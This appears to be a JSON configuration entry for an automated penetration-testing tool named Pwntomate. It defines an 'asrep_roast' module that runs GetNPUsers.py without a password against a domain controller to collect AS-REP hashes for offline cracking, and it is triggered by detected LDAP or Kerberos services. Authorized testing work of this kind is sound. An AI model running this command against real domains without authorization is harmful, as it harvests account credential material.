{
  "toolname": "asrep_roast",
  "command": "GetNPUsers.py {domain}/ -no-pass -dc-ip {ip} -request > {outputdir}/asreproast_hashes.txt",
  "trigger": [
    "ldap",
    "kerberos-sec"
  ],
  "active": true,
  "category": "07. Credential Access",
  "description": "Pwntomate tool: asrep_roast \u2014 triggers on ['ldap', 'kerberos-sec']"
}